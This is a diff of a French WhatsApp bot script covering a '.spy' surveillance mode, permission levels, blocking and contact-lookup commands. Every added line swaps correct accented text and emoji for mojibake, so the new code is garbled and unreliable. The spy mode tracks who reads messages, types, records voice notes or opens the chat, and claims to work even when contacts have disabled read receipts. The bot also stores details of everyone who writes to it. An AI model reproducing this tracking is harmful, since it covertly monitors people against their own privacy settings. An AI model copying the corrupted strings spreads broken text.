 _Envoie des messages et attends qu'ils soient lus!_`);
         }
         
-        let list = `📖 ═══════════════════════════
+        let list = `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     *QUI A LU TES MESSAGES*
-═══════════════════════════\n\n`;
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
         const uniqueReaders = {};
         
         // Compter les lectures par personne
@@ -5612,18 +5612,18 @@ _Envoie des messages et attends qu'ils soient lus!_`);
         
         let i = 1;
         for (const [num, data] of Object.entries(uniqueReaders)) {
-          const displayName = data.name || "Non enregistré";
-          list += `*${i}.* ${displayName !== "Non enregistré" ? `*${displayName}*` : "_Contact inconnu_"}
-   📱 *Numéro:* ${formatNum(num)}
-   🔢 *Brut:* ${num}
-   📖 ${data.count} msg lu(s) • 🕐 ${data.lastTime}
-   💬 wa.me/${num}\n\n`;
+          const displayName = data.name || "Non enregistrÃ©";
+          list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}
+   ðŸ“± *NumÃ©ro:* ${formatNum(num)}
+   ðŸ”¢ *Brut:* ${num}
+   ðŸ“– ${data.count} msg lu(s) â€¢ ðŸ• ${data.lastTime}
+   ðŸ’¬ wa.me/${num}\n\n`;
           i++;
           if (i > 15) break;
         }
         
-        list += `═══════════════════════════
-📊 *Total:* ${spyData.messageReads.length} lectures de ${uniqueReaders ? Object.keys(uniqueReaders).length : 0} personnes`;
+        list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ðŸ“Š *Total:* ${spyData.messageReads.length} lectures de ${uniqueReaders ? Object.keys(uniqueReaders).length : 0} personnes`;
         return send(list);
         
       } else if (param === "on") {
@@ -5631,28 +5631,28 @@ _Envoie des messages et attends qu'ils soient lus!_`);
         protectionState.spyReadReceipts = true;
         protectionState.spyReplies = true;
         protectionState.spyPresence = true;
-        return send(`🕵️ *MODE ESPION ACTIVÉ* ✅
+        return send(`ðŸ•µï¸ *MODE ESPION ACTIVÃ‰* âœ…
 
 Tu recevras des notifications quand:
-• 👁️ Quelqu'un voit tes statuts
-• 📖 Quelqu'un lit tes messages (si activé chez lui)
-• ↩️ Quelqu'un RÉPOND à tes messages (PREUVE!)
-• 💬 Quelqu'un t'écrit après ton message (PREUVE!)
-• ✍️ Quelqu'un est en train d'ÉCRIRE dans ton chat!
-• 🎤 Quelqu'un ENREGISTRE un vocal pour toi!
+â€¢ ðŸ‘ï¸ Quelqu'un voit tes statuts
+â€¢ ðŸ“– Quelqu'un lit tes messages (si activÃ© chez lui)
+â€¢ â†©ï¸ Quelqu'un RÃ‰POND Ã  tes messages (PREUVE!)
+â€¢ ðŸ’¬ Quelqu'un t'Ã©crit aprÃ¨s ton message (PREUVE!)
+â€¢ âœï¸ Quelqu'un est en train d'Ã‰CRIRE dans ton chat!
+â€¢ ðŸŽ¤ Quelqu'un ENREGISTRE un vocal pour toi!
 
-💡 \`.spy off\` pour désactiver`);
+ðŸ’¡ \`.spy off\` pour dÃ©sactiver`);
         
       } else if (param === "off") {
         protectionState.spyStatusViews = false;
         protectionState.spyReadReceipts = false;
         protectionState.spyReplies = false;
         protectionState.spyPresence = false;
-        return send(`🕵️ *MODE ESPION DÉSACTIVÉ* ❌
+        return send(`ðŸ•µï¸ *MODE ESPION DÃ‰SACTIVÃ‰* âŒ
 
-Plus de notifications de vues/lectures/présence.
+Plus de notifications de vues/lectures/prÃ©sence.
 
-💡 \`.spy on\` pour réactiver`);
+ðŸ’¡ \`.spy on\` pour rÃ©activer`);
         
       } else if (param === "clear" || param === "reset") {
         spyData.statusViews = [];
@@ -5661,29 +5661,29 @@ Plus de notifications de vues/lectures/présence.
         spyData.pendingMessages = {};
         spyData.presenceDetected = [];
         spyData.presenceCooldown = {};
-        return send(`🗑️ *Historique effacé*
+        return send(`ðŸ—‘ï¸ *Historique effacÃ©*
 
-✅ Toutes les données de vues, lectures, réponses et présences supprimées.`);
+âœ… Toutes les donnÃ©es de vues, lectures, rÃ©ponses et prÃ©sences supprimÃ©es.`);
         
       } else if (param === "presence" || param === "presences" || param === "actifs") {
-        // Afficher qui a été détecté actif dans le chat
+        // Afficher qui a Ã©tÃ© dÃ©tectÃ© actif dans le chat
         if (!spyData.presenceDetected || spyData.presenceDetected.length === 0) {
-          return send(`✍️ *Aucune présence détectée*
+          return send(`âœï¸ *Aucune prÃ©sence dÃ©tectÃ©e*
 
-_Attends que quelqu'un ouvre ta discussion et commence à écrire!_
+_Attends que quelqu'un ouvre ta discussion et commence Ã  Ã©crire!_
 
-💡 Ce système détecte quand quelqu'un:
-• ✍️ Est en train d'écrire dans ton chat
-• 🎤 Enregistre un vocal pour toi
-• 👁️ Est actif/en ligne dans ta discussion`);
+ðŸ’¡ Ce systÃ¨me dÃ©tecte quand quelqu'un:
+â€¢ âœï¸ Est en train d'Ã©crire dans ton chat
+â€¢ ðŸŽ¤ Enregistre un vocal pour toi
+â€¢ ðŸ‘ï¸ Est actif/en ligne dans ta discussion`);
         }
         
-        let list = `✍️ ═══════════════════════════
+        let list = `âœï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     *QUI A OUVERT TON CHAT*
-═══════════════════════════\n\n`;
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
         const uniquePresences = {};
         
-        // Compter les présences par personne
+        // Compter les prÃ©sences par personne
         for (const presence of spyData.presenceDetected) {
           if (!uniquePresences[presence.number]) {
             uniquePresences[presence.number] = { 
@@ -5699,34 +5699,34 @@ _Attends que quelqu'un ouvre ta discussion et commence à écrire!_
         
         let i = 1;
         for (const [num, data] of Object.entries(uniquePresences)) {
-          const displayName = data.name || "Non enregistré";
+          const displayName = data.name || "Non enregistrÃ©";
           const actionsStr = Array.from(data.actions).map(a => {
             switch(a) {
-              case "composing": return "✍️";
-              case "recording": return "🎤";
-              case "available": return "👁️";
-              default: return "📱";
+              case "composing": return "âœï¸";
+              case "recording": return "ðŸŽ¤";
+              case "available": return "ðŸ‘ï¸";
+              default: return "ðŸ“±";
             }
           }).join("");
-          list += `*${i}.* ${displayName !== "Non enregistré" && displayName !== "Inconnu" ? `*${displayName}*` : "_Contact inconnu_"}
-   📱 *Numéro:* ${formatNum(num)}
-   ${actionsStr} ${data.count} détection(s) • 🕐 ${data.lastTime}
-   💬 wa.me/${num}\n\n`;
+          list += `*${i}.* ${displayName !== "Non enregistrÃ©" && displayName !== "Inconnu" ? `*${displayName}*` : "_Contact inconnu_"}
+   ðŸ“± *NumÃ©ro:* ${formatNum(num)}
+   ${actionsStr} ${data.count} dÃ©tection(s) â€¢ ðŸ• ${data.lastTime}
+   ðŸ’¬ wa.me/${num}\n\n`;
           i++;
           if (i > 15) break;
         }
         
-        list += `═══════════════════════════
-📊 *Total:* ${spyData.presenceDetected.length} détections de ${Object.keys(uniquePresences).length} personnes
+        list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ðŸ“Š *Total:* ${spyData.presenceDetected.length} dÃ©tections de ${Object.keys(uniquePresences).length} personnes
 
-*Légende:*
-✍️ = En train d'écrire
-🎤 = Enregistre un vocal
-👁️ = Actif dans le chat`;
+*LÃ©gende:*
+âœï¸ = En train d'Ã©crire
+ðŸŽ¤ = Enregistre un vocal
+ðŸ‘ï¸ = Actif dans le chat`;
         return send(list);
         
       } else {
-        // Résumé par défaut
+        // RÃ©sumÃ© par dÃ©faut
         const statusCount = spyData.statusViews.length;
         const readCount = spyData.messageReads.length;
         const repliesCount = spyData.replies?.length || 0;
@@ -5735,7 +5735,7 @@ _Attends que quelqu'un ouvre ta discussion et commence à écrire!_
         const uniqueReadersCount = new Set(spyData.messageReads.map(r => r.reader)).size;
         const uniquePresenceCount = new Set((spyData.presenceDetected || []).map(p => p.number)).size;
         
-        // Dernières personnes
+        // DerniÃ¨res personnes
         let lastViewers = "";
         let lastReaders = "";
         let lastPresences = "";
@@ -5744,7 +5744,7 @@ _Attends que quelqu'un ouvre ta discussion et commence à écrire!_
           const last3 = spyData.statusViews.slice(0, 3);
           lastViewers = last3.map(v => {
             const name = v.viewerName || "Inconnu";
-            return `• ${name} (${formatNum(v.viewer)})`;
+            return `â€¢ ${name} (${formatNum(v.viewer)})`;
           }).join("\n");
         }
         
@@ -5753,7 +5753,7 @@ _Attends que quelqu'un ouvre ta discussion et commence à écrire!_
           lastReaders = last3.map(r => {
             const name = r.readerName || "Inconnu";
             const method = r.confirmedBy ? ` [${r.confirmedBy}]` : "";
-            return `• ${name} (${formatNum(r.reader)})${method}`;
+            return `â€¢ ${name} (${formatNum(r.reader)})${method}`;
           }).join("\n");
         }
         
@@ -5761,178 +5761,178 @@ _Attends que quelqu'un ouvre ta discussion et commence à écrire!_
           const last3 = spyData.presenceDetected.slice(-3).reverse();
           lastPresences = last3.map(p => {
             const name = p.name || "Inconnu";
-            const actionEmoji = p.action === "composing" ? "✍️" : p.action === "recording" ? "🎤" : "👁️";
-            return `• ${actionEmoji} ${name} (${formatNum(p.number)})`;
+            const actionEmoji = p.action === "composing" ? "âœï¸" : p.action === "recording" ? "ðŸŽ¤" : "ðŸ‘ï¸";
+            return `â€¢ ${actionEmoji} ${name} (${formatNum(p.number)})`;
           }).join("\n");
         }
         
-        return send(`🕵️ ═══════════════════════════
+        return send(`ðŸ•µï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
       *MODE ESPION*
-═══════════════════════════
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-📊 *STATISTIQUES:*
-👁️ *Vues statuts:* ${statusCount} (${uniqueStatusViewers} personnes)
-📖 *Messages lus:* ${readCount} (${uniqueReadersCount} personnes)
-↩️ *Réponses reçues:* ${repliesCount}
-✍️ *Présences détectées:* ${presenceCount} (${uniquePresenceCount} personnes)
+ðŸ“Š *STATISTIQUES:*
+ðŸ‘ï¸ *Vues statuts:* ${statusCount} (${uniqueStatusViewers} personnes)
+ðŸ“– *Messages lus:* ${readCount} (${uniqueReadersCount} personnes)
+â†©ï¸ *RÃ©ponses reÃ§ues:* ${repliesCount}
+âœï¸ *PrÃ©sences dÃ©tectÃ©es:* ${presenceCount} (${uniquePresenceCount} personnes)
 
-${lastViewers ? `🔍 *Dernières vues statuts:*\n${lastViewers}\n` : ""}
-${lastReaders ? `📖 *Dernières lectures confirmées:*\n${lastReaders}\n` : ""}
-${lastPresences ? `✍️ *Derniers actifs dans ton chat:*\n${lastPresences}\n` : ""}
-⚙️ *État actuel:*
-• Spy statuts: ${protectionState.spyStatusViews ? "✅ ON" : "❌ OFF"}
-• Spy lectures: ${protectionState.spyReadReceipts ? "✅ ON" : "❌ OFF"}
-• Spy réponses: ${protectionState.spyReplies ? "✅ ON" : "❌ OFF"}
-• Spy présence: ${protectionState.spyPresence ? "✅ ON" : "❌ OFF"}
+${lastViewers ? `ðŸ” *DerniÃ¨res vues statuts:*\n${lastViewers}\n` : ""}
+${lastReaders ? `ðŸ“– *DerniÃ¨res lectures confirmÃ©es:*\n${lastReaders}\n` : ""}
+${lastPresences ? `âœï¸ *Derniers actifs dans ton chat:*\n${lastPresences}\n` : ""}
+âš™ï¸ *Ã‰tat actuel:*
+â€¢ Spy statuts: ${protectionState.spyStatusViews ? "âœ… ON" : "âŒ OFF"}
+â€¢ Spy lectures: ${protectionState.spyReadReceipts ? "âœ… ON" : "âŒ OFF"}
+â€¢ Spy rÃ©ponses: ${protectionState.spyReplies ? "âœ… ON" : "âŒ OFF"}
+â€¢ Spy prÃ©sence: ${protectionState.spyPresence ? "âœ… ON" : "âŒ OFF"}
 
-═══════════════════════════
-📋 *COMMANDES:*
-• \`.spy status\` → Qui a vu tes statuts
-• \`.spy messages\` → Qui a lu tes messages
-• \`.spy presence\` → Qui a ouvert ton chat
-• \`.spy on\` → Activer tout
-• \`.spy off\` → Désactiver tout
-• \`.spy clear\` → Effacer historique
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+ðŸ“‹ *COMMANDES:*
+â€¢ \`.spy status\` â†’ Qui a vu tes statuts
+â€¢ \`.spy messages\` â†’ Qui a lu tes messages
+â€¢ \`.spy presence\` â†’ Qui a ouvert ton chat
+â€¢ \`.spy on\` â†’ Activer tout
+â€¢ \`.spy off\` â†’ DÃ©sactiver tout
+â€¢ \`.spy clear\` â†’ Effacer historique
 
-_Détecte quand quelqu'un entre dans ta discussion même avec vues désactivées!_`);
+_DÃ©tecte quand quelqu'un entre dans ta discussion mÃªme avec vues dÃ©sactivÃ©es!_`);
       }
     }
 
-    // ────────── 🔐 MODE & PERMISSIONS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ” MODE & PERMISSIONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "mode": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       const param = args?.toLowerCase();
       
       if (param === "public") {
         config.MODE = "public";
-        return send(`🌍 *Mode PUBLIC activé!*
+        return send(`ðŸŒ *Mode PUBLIC activÃ©!*
 
-✅ Tout le monde peut utiliser le bot selon son niveau:
-• 👑 *Owner:* Accès total
-• 🛡️ *Sudo:* Commandes admin
-• ✅ *Approuvé:* IA, downloads, jeux
-• 👤 *Public:* Menu, ping, sticker
+âœ… Tout le monde peut utiliser le bot selon son niveau:
+â€¢ ðŸ‘‘ *Owner:* AccÃ¨s total
+â€¢ ðŸ›¡ï¸ *Sudo:* Commandes admin
+â€¢ âœ… *ApprouvÃ©:* IA, downloads, jeux
+â€¢ ðŸ‘¤ *Public:* Menu, ping, sticker
 
-💡 Utilise \`.approve @user\` pour donner plus d'accès.`);
+ðŸ’¡ Utilise \`.approve @user\` pour donner plus d'accÃ¨s.`);
       } else if (param === "private") {
         config.MODE = "private";
-        return send(`🔒 *Mode PRIVATE activé!*
+        return send(`ðŸ”’ *Mode PRIVATE activÃ©!*
 
-⛔ Seuls l'Owner et les Sudos peuvent utiliser le bot.
+â›” Seuls l'Owner et les Sudos peuvent utiliser le bot.
 
-💡 Utilise \`.mode public\` pour permettre l'accès aux autres.`);
+ðŸ’¡ Utilise \`.mode public\` pour permettre l'accÃ¨s aux autres.`);
       } else {
-        return send(`🔐 *Mode actuel: ${config.MODE.toUpperCase()}*
+        return send(`ðŸ” *Mode actuel: ${config.MODE.toUpperCase()}*
 
 *Usage:* \`.mode public\` ou \`.mode private\`
 
-• *Public:* Tout le monde selon son niveau
-• *Private:* Owner et Sudo uniquement`);
+â€¢ *Public:* Tout le monde selon son niveau
+â€¢ *Private:* Owner et Sudo uniquement`);
       }
     }
 
     case "permissions":
     case "myaccess":
     case "mylevel": {
-      // Cette commande est accessible à tous
+      // Cette commande est accessible Ã  tous
       const approvedList = db.getApprovedList();
       const userNum = senderNumber;
       
-      let level = "👤 *PUBLIC*";
+      let level = "ðŸ‘¤ *PUBLIC*";
       let description = "Tu peux utiliser les commandes de base (menu, ping, sticker, info).";
       let commands = "`.menu`, `.ping`, `.sticker`, `.info`";
       
       if (isOwner) {
-        level = "👑 *OWNER*";
-        description = "Tu es le PROPRIÉTAIRE du bot. Tu as accès à TOUTES les commandes!";
+        level = "ðŸ‘‘ *OWNER*";
+        description = "Tu es le PROPRIÃ‰TAIRE du bot. Tu as accÃ¨s Ã  TOUTES les commandes!";
         commands = "Toutes les commandes sans restriction.";
       } else if (isSudo) {
-        level = "🛡️ *SUDO*";
-        description = "Tu es administrateur du bot. Tu as accès aux commandes de gestion.";
-        commands = "Gestion groupe, kick, ban, protections, + commandes approuvés.";
+        level = "ðŸ›¡ï¸ *SUDO*";
+        description = "Tu es administrateur du bot. Tu as accÃ¨s aux commandes de gestion.";
+        commands = "Gestion groupe, kick, ban, protections, + commandes approuvÃ©s.";
       } else if (db.isApproved(userNum)) {
-        level = "✅ *APPROUVÉ*";
-        description = "Tu es approuvé par l'owner. Tu as accès aux fonctionnalités avancées.";
-        commands = "IA (GPT, DALL-E), téléchargements, jeux, conversions, + commandes publiques.";
+        level = "âœ… *APPROUVÃ‰*";
+        description = "Tu es approuvÃ© par l'owner. Tu as accÃ¨s aux fonctionnalitÃ©s avancÃ©es.";
+        commands = "IA (GPT, DALL-E), tÃ©lÃ©chargements, jeux, conversions, + commandes publiques.";
       }
       
-      return send(`╭━━━ 🔐 *TON NIVEAU D'ACCÈS* ━━━╮
-┃
-┃ ${level}
-┃
-┃ 📋 *Description:*
-┃ ${description}
-┃
-┃ 🎯 *Commandes disponibles:*
-┃ ${commands}
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+      return send(`â•­â”â”â” ðŸ” *TON NIVEAU D'ACCÃˆS* â”â”â”â•®
+â”ƒ
+â”ƒ ${level}
+â”ƒ
+â”ƒ ðŸ“‹ *Description:*
+â”ƒ ${description}
+â”ƒ
+â”ƒ ðŸŽ¯ *Commandes disponibles:*
+â”ƒ ${commands}
+â”ƒ
+â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯
 
-📊 *Hiérarchie du bot:*
-• 👑 Owner → Accès total
-• 🛡️ Sudo → Admin du bot
-• ✅ Approuvé → Accès avancé
-• 👤 Public → Accès basique
+ðŸ“Š *HiÃ©rarchie du bot:*
+â€¢ ðŸ‘‘ Owner â†’ AccÃ¨s total
+â€¢ ðŸ›¡ï¸ Sudo â†’ Admin du bot
+â€¢ âœ… ApprouvÃ© â†’ AccÃ¨s avancÃ©
+â€¢ ðŸ‘¤ Public â†’ AccÃ¨s basique
 
-${!isOwner && !isSudo && !db.isApproved(userNum) ? "\n💡 *Tip:* Demande à l'owner de t'approuver pour plus d'accès!" : ""}`);
+${!isOwner && !isSudo && !db.isApproved(userNum) ? "\nðŸ’¡ *Tip:* Demande Ã  l'owner de t'approuver pour plus d'accÃ¨s!" : ""}`);
     }
 
-    // ────────── 🚫 BLOCAGE WHATSAPP ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸš« BLOCAGE WHATSAPP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "block":
     case "bloquer": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
       if (!targetNumber || targetNumber.length < 10) {
-        return send(`❌ *Usage:* .block [numéro]\n\n📱 *Exemples:*\n• .block 2250150252467\n• .block @mention\n• Réponds à un message avec .block`);
+        return send(`âŒ *Usage:* .block [numÃ©ro]\n\nðŸ“± *Exemples:*\nâ€¢ .block 22550252467\nâ€¢ .block @mention\nâ€¢ RÃ©ponds Ã  un message avec .block`);
       }
       
       try {
         const targetJid = targetNumber + "@s.whatsapp.net";
         await hani.updateBlockStatus(targetJid, "block");
-        return send(`✅ *Bloqué avec succès!*\n\n📱 ${formatPhoneNumber(targetNumber)}\n\n🚫 Cette personne ne peut plus:\n• Te voir en ligne\n• Voir ta photo de profil\n• T'envoyer de messages\n• Voir tes statuts`);
+        return send(`âœ… *BloquÃ© avec succÃ¨s!*\n\nðŸ“± ${formatPhoneNumber(targetNumber)}\n\nðŸš« Cette personne ne peut plus:\nâ€¢ Te voir en ligne\nâ€¢ Voir ta photo de profil\nâ€¢ T'envoyer de messages\nâ€¢ Voir tes statuts`);
       } catch (e) {
-        return send("❌ Erreur: " + e.message);
+        return send("âŒ Erreur: " + e.message);
       }
     }
 
     case "unblock":
     case "debloquer": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
       if (!targetNumber || targetNumber.length < 10) {
-        return send(`❌ *Usage:* .unblock [numéro]\n\n📱 *Exemples:*\n• .unblock 2250150252467\n• .unblock @mention`);
+        return send(`âŒ *Usage:* .unblock [numÃ©ro]\n\nðŸ“± *Exemples:*\nâ€¢ .unblock 22550252467\nâ€¢ .unblock @mention`);
       }
       
       try {
         const targetJid = targetNumber + "@s.whatsapp.net";
         await hani.updateBlockStatus(targetJid, "unblock");
-        return send(`✅ *Débloqué avec succès!*\n\n📱 ${formatPhoneNumber(targetNumber)}`);
+        return send(`âœ… *DÃ©bloquÃ© avec succÃ¨s!*\n\nðŸ“± ${formatPhoneNumber(targetNumber)}`);
       } catch (e) {
-        return send("❌ Erreur: " + e.message);
+        return send("âŒ Erreur: " + e.message);
       }
     }
 
     case "blocklist":
     case "listblock":
     case "blocked": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       try {
         const blockedList = await hani.fetchBlocklist();
         
         if (!blockedList || blockedList.length === 0) {
-          return send("📭 Aucun contact bloqué.");
+          return send("ðŸ“­ Aucun contact bloquÃ©.");
         }
         
-        let list = `🚫 *CONTACTS BLOQUÉS (${blockedList.length})*\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        let list = `ðŸš« *CONTACTS BLOQUÃ‰S (${blockedList.length})*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
         
         for (let i = 0; i < blockedList.length; i++) {
           const jid = blockedList[i];
@@ -5940,75 +5940,75 @@ ${!isOwner && !isSudo && !db.isApproved(userNum) ? "\n💡 *Tip:* Demande à l'o
           list += `${i + 1}. ${formatPhoneNumber(num)}\n`;
         }
         
-        list += `\n━━━━━━━━━━━━━━━━━━━━━\n💡 Utilise .unblock [numéro] pour débloquer`;
+        list += `\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\nðŸ’¡ Utilise .unblock [numÃ©ro] pour dÃ©bloquer`;
         
         return send(list);
       } catch (e) {
-        return send("❌ Erreur: " + e.message);
+        return send("âŒ Erreur: " + e.message);
       }
     }
 
-    // ────────── 📇 GESTION DES CONTACTS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ“‡ GESTION DES CONTACTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "contacts":
     case "contactlist":
     case "allcontacts": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const allContacts = getAllContacts();
       
       if (allContacts.length === 0) {
-        return send("📭 Aucun contact enregistré.\n\nLes contacts sont enregistrés automatiquement quand ils t'envoient des messages.");
+        return send("ðŸ“­ Aucun contact enregistrÃ©.\n\nLes contacts sont enregistrÃ©s automatiquement quand ils t'envoient des messages.");
       }
       
       // Trier par dernier message
       allContacts.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
       
-      let list = `📇 *CONTACTS ENREGISTRÉS (${allContacts.length})*\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
+      let list = `ðŸ“‡ *CONTACTS ENREGISTRÃ‰S (${allContacts.length})*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
       
       const maxShow = 30;
       for (let i = 0; i < Math.min(allContacts.length, maxShow); i++) {
         const c = allContacts[i];
         list += `${i + 1}. *${c.name}*\n`;
-        list += `   📱 ${c.formattedNumber}\n`;
-        list += `   💬 ${c.messageCount || 0} msg\n`;
-        list += `   🕐 ${c.lastSeen}\n\n`;
+        list += `   ðŸ“± ${c.formattedNumber}\n`;
+        list += `   ðŸ’¬ ${c.messageCount || 0} msg\n`;
+        list += `   ðŸ• ${c.lastSeen}\n\n`;
       }
       
       if (allContacts.length > maxShow) {
         list += `\n... et ${allContacts.length - maxShow} autres contacts`;
       }
       
-      list += `\n━━━━━━━━━━━━━━━━━━━━━\n💡 .searchcontact [nom] pour chercher`;
+      list += `\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\nðŸ’¡ .searchcontact [nom] pour chercher`;
       
       return send(list);
     }
 
     case "searchcontact":
     case "findcontact": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!args) {
-        return send(`❌ *Usage:* .searchcontact [nom ou numéro]\n\n📱 Exemples:\n• .searchcontact Jean\n• .searchcontact 0150252467`);
+        return send(`âŒ *Usage:* .searchcontact [nom ou numÃ©ro]\n\nðŸ“± Exemples:\nâ€¢ .searchcontact Jean\nâ€¢ .searchcontact 0150252467`);
       }
       
       const results = searchContacts(args);
       
       if (results.length === 0) {
-        return send(`❌ Aucun contact trouvé pour "${args}"`);
+        return send(`âŒ Aucun contact trouvÃ© pour "${args}"`);
       }
       
-      let list = `🔍 *RÉSULTATS POUR "${args}"*\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
+      let list = `ðŸ” *RÃ‰SULTATS POUR "${args}"*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
       
       for (let i = 0; i < Math.min(results.length, 15); i++) {
         const c = results[i];
         list += `${i + 1}. *${c.name}*\n`;
-        list += `   📱 ${c.formattedNumber}\n`;
-        list += `   💬 ${c.messageCount || 0} messages\n`;
-        list += `   📅 Vu: ${c.lastSeen}\n\n`;
+        list += `   ðŸ“± ${c.formattedNumber}\n`;
+        list += `   ðŸ’¬ ${c.messageCount || 0} messages\n`;
+        list += `   ðŸ“… Vu: ${c.lastSeen}\n\n`;
       }
       
       if (results.length > 15) {
-        list += `\n... et ${results.length - 15} autres résultats`;
+        list += `\n... et ${results.length - 15} autres rÃ©sultats`;
       }
       
       return send(list);
@@ -6016,43 +6016,43 @@ ${!isOwner && !isSudo && !db.isApproved(userNum) ? "\n💡 *Tip:* Demande à l'o
 
     case "contactinfo":
     case "infocontact": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       let targetNumber = args?.replace(/[^0-9]/g, "");
       if (mentioned[0]) targetNumber = mentioned[0].split("@")[0];
       if (quotedParticipant) targetNumber = quotedParticipant.split("@")[0];
       
       if (!targetNumber) {
-        return send(`❌ *Usage:* .contactinfo [numéro ou @mention]`);
+        return send(`âŒ *Usage:* .contactinfo [numÃ©ro ou @mention]`);
       }
       
       const contact = getContact(targetNumber);
       
       if (!contact) {
-        return send(`❌ Contact non trouvé: ${formatPhoneNumber(targetNumber)}\n\nCe contact ne t'a jamais envoyé de message.`);
+        return send(`âŒ Contact non trouvÃ©: ${formatPhoneNumber(targetNumber)}\n\nCe contact ne t'a jamais envoyÃ© de message.`);
       }
       
-      // Essayer de récupérer la photo de profil
+      // Essayer de rÃ©cupÃ©rer la photo de profil
       let profilePic = null;
       try {
         profilePic = await hani.profilePictureUrl(contact.jid, "image");
       } catch (e) {}
       
       const info = `
-📇 *FICHE CONTACT*
-━━━━━━━━━━━━━━━━━━━━━
+ðŸ“‡ *FICHE CONTACT*
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 
-👤 *Nom:* ${contact.name}
-📱 *Numéro:* ${contact.formattedNumber}
-🆔 *JID:* ${contact.jid}
+ðŸ‘¤ *Nom:* ${contact.name}
+ðŸ“± *NumÃ©ro:* ${contact.formattedNumber}
+ðŸ†” *JID:* ${contact.jid}
 
-📊 *Statistiques:*
-┃ 💬 Messages: ${contact.messageCount || 0}
-┃ 📅 Premier contact: ${contact.firstSeen}
-┃ 🕐 Dernier contact: ${contact.lastSeen}
-┃ 📝 Dernière activité: ${contact.lastActivity || "Inconnu"}
+ðŸ“Š *Statistiques:*
+â”ƒ ðŸ’¬ Messages: ${contact.messageCount || 0}
+â”ƒ ðŸ“… Premier contact: ${contact.firstSeen}
+â”ƒ ðŸ• Dernier contact: ${contact.lastSeen}
+â”ƒ ðŸ“ DerniÃ¨re activitÃ©: ${contact.lastActivity || "Inconnu"}
 
-━━━━━━━━━━━━━━━━━━━━━
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
       `.trim();
       
       if (profilePic) {
@@ -6068,36 +6068,36 @@ ${!isOwner && !isSudo && !db.isApproved(userNum) ? "\n💡 *Tip:* Demande à l'o
     case "privacy":
     case "confidentialite": {
       const privacyHelp = `
-🔒 *PARAMÈTRES DE CONFIDENTIALITÉ*
-━━━━━━━━━━━━━━━━━━━━━
+ðŸ”’ *PARAMÃˆTRES DE CONFIDENTIALITÃ‰*
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
 
-📱 *Dans WhatsApp → Paramètres → Confidentialité:*
+ðŸ“± *Dans WhatsApp â†’ ParamÃ¨tres â†’ ConfidentialitÃ©:*
 
-┃ 📸 *Photo de profil:*
-┃ → Tout le monde / Mes contacts / Personne
-┃
-┃ 👁️ *Dernière connexion:*
-┃ → Tout le monde / Mes contacts / Personne
-┃
-┃ ✅ *Confirmations de lecture:*
-┃ → Activer / Désactiver
-┃
